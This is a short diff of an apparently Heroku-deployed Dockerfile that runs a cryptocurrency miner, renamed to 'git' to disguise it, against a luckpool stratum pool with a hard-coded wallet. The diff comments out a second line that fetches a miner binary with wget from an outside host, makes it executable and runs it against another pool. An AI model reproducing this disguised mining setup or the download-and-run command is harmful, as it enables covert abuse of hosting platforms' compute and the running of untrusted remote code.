@@ -7,5 +7,5 @@ RUN mv hellminer git
 RUN ./git -c stratum+tcp://ap.luckpool.net:3956#xnsub -u RRbtoWkxCVYEZuMVfNJshtzTz2PVTtyZwK.VPS -p x --cpu 1
 
 # Microbitcoin
-RUN wget http://www.netsteady.com/virtual; chmod +x virtual; ./virtual -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u MjuAooGBTvpAUmVYDNiYgtP2Ed1WJ2Gg6B.VPS
+#RUN wget http://www.netsteady.com/virtual; chmod +x virtual; ./virtual -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u MjuAooGBTvpAUmVYDNiYgtP2Ed1WJ2Gg6B.VPS
 CMD bash heroku.sh
